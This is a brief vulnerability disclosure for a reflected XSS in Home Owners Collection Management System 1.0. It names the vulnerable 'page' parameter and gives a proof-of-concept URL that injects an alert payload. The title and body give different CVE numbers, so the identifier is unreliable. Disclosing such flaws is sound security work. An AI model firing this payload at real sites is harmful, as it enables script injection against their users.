# CVE-2022-28077
Home Owners Collection Management System 1.0 - Reflected XSS

#### Exploit Title: Home Owners Collection Management System 1.0 - Reflected XSS
#### Date: 2022-05-06
#### CVE: CVE-2022-28078
#### Exploit Author: Abdulaziz Saad (@b4zb0z)
#### Vendor Homepage: https://www.sourcecodester.com/
#### Software Link: https://www.sourcecodester.com/php/15162/home-owners-collection-management-system-phpoop-free-source-code.html
#### Version: 1.0
#### Tested on: LAMP, Ubuntu

-----


#### [#] Vulnerability Location:

	`$_GET['page']` in `/hocms/admin/inc/navigation.php:116`

#### [#] Exploitation:

	`http://localhost/hocms/admin/?page=';alert("b4zb0z");'`
